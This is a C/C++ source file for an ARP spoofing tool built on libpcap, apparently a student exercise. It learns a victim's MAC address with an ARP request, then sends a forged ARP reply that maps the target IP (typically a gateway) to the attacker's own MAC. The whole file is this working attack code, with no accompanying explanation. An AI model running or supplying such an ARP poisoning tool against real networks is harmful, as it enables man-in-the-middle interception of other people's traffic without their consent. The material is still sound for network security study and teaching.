#include <cstdio>
#include <stdint.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>

struct eth_header {
    u_char eth_dmac[6];             /* ether destination (MAC) Address (6 Byte) */
    u_char eth_smac[6];             /* ether source (MAC) Address (6 Byte)*/
    u_short eth_type;               /* ether type (2 Byte) */
};
 
struct arp_header {
    u_short arp_hwtype;             /* Hardware Type (2 byte) */
    u_short arp_protype;            /* Protocol Type (2 Byte) */
    u_char arp_hlen;                /* Hardware Length (1 Byte) */
    u_char arp_plen;                /* Protocol Length (1 Byte) */
    u_short arp_opr;                /* Operation (2 Byte) */
    u_char arp_shwaddr[6];          /* Sender Hardware (MAC) Address (6 Byte) */
    u_char arp_sipaddr[4];          /* Sender Protocol(IP) Address (4 Byte) */
    u_char arp_thwaddr[6];          /* Target Hardware (MAC) Address (6 Byte) */
    u_char arp_tproaddr[4];         /* Target Protocol (IP) Address (4 Byte) */
};
 
struct eth_arp_reply {
    eth_header eth;
    arp_header arph;
};

void findMyMac(unsigned char add[]){
    struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int success = 0;

	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock == -1) { /* handle error*/ };

	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = 
	it + (ifc.ifc_len / sizeof(struct ifreq));

	for (; it != end; ++it) {
	    strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }
    if (success) memcpy(add, ifr.ifr_hwaddr.sa_data, 6);
}

int main(int argc, char* argv[])
{
    uint8_t myMac[6],senderMac[6];
    uint8_t senderIP[4]={0,},targetIP[4]={0,},myIP[4]={0,};
    char *dev = argv[1];

    // find my IP
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ); 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("IP address Error\n");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
    }

    findMyMac(myMac);
    int j=0;
    for(int i=0; i<strlen(argv[2]); i++){
	if(argv[2][i]=='.') j++;
	else senderIP[j]=senderIP[j]*10+argv[2][i]-'0';
    }
    j=0;
    for(int i=0; i<strlen(argv[3]); i++){
	if(argv[3][i]=='.') j++;
	else targetIP[j]=targetIP[j]*10+argv[3][i]-'0';
    }
    j=0;
    for(int i=0; i<strlen(ipstr); i++){
	if(ipstr[i]=='.') j++;
	else myIP[j]=myIP[j]*10+ipstr[i]-'0';
    }	

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
 
    if(!(dev = pcap_lookupdev(errbuf))) {   
        printf("%s", errbuf); return -1;
    }
 
    eth_header eth;
    for(int i=0; i<6; i++) eth.eth_dmac[i]=0xFF;
    memcpy(eth.eth_smac, myMac, sizeof(myMac));
    eth.eth_type = htons(ETH_P_ARP);
 
    arp_header arph;
    arph.arp_hwtype = htons(ARPHRD_ETHER);
    arph.arp_protype = htons(ETH_P_IP);
    arph.arp_hlen = sizeof(eth.eth_dmac);
    arph.arp_plen = sizeof(arph.arp_sipaddr);
    arph.arp_opr = htons(ARPOP_REQUEST);
    memcpy(arph.arp_shwaddr, myMac, sizeof(myMac));

    memcpy(arph.arp_sipaddr, myIP, sizeof(myIP));
    for(int i=0; i<6; i++) arph.arp_thwaddr[i]=0;
    memcpy(arph.arp_tproaddr, senderIP, sizeof(senderIP));
 


    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	return -1;
    }

    eth_arp_reply reply;
    reply.eth = eth;
    reply.arph = arph;

    
    if (pcap_sendpacket(handle,(const u_char*)&reply ,(sizeof(reply))) != 0){
       printf("pcap_sendpacket error\n");
    }
    else printf("arp packet send\n");
    
    
    while(true){
	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_next_ex(handle, &header, &packet);
	if (res == 0) continue;
	if (res == -1 || res == -2) break;
	if(packet[12]!=0x08 || packet[13]!=0x06) continue;  // check if arp
	if(packet[20]!=0x00 || packet[21]!=0x02) continue;  // check if reply
	if(packet[38]!=myIP[0] || packet[39]!=myIP[1]) continue;  // check if myIP
	if(packet[40]!=myIP[2] || packet[41]!=myIP[3]) continue;
	for(int i=0; i<6; i++) senderMac[i]=packet[i+6];
        break;
    }

	printf("arp packet received\n");



    memcpy(eth.eth_dmac, senderMac, sizeof(senderMac));
    memcpy(eth.eth_smac, myMac, sizeof(myMac));
    eth.eth_type = htons(ETH_P_ARP);
 
    arph.arp_hwtype = htons(ARPHRD_ETHER);
    arph.arp_protype = htons(ETH_P_IP);
    arph.arp_hlen = sizeof(eth.eth_dmac);
    arph.arp_plen = sizeof(arph.arp_sipaddr);
    arph.arp_opr = htons(ARPOP_REPLY);
    memcpy(arph.arp_shwaddr, myMac, sizeof(myMac));

    memcpy(arph.arp_sipaddr, targetIP, sizeof(targetIP));
    memcpy(arph.arp_thwaddr, senderMac, sizeof(senderMac));
    memcpy(arph.arp_tproaddr, senderIP, sizeof(senderIP));
 
    reply.eth = eth;
    reply.arph = arph;

    if (pcap_sendpacket(handle,(const u_char*)&reply ,(sizeof(reply))) != 0){
        printf("pcap_sendpacket error\n");
    }
    else{
        printf("arp packet send\n");
    }
}



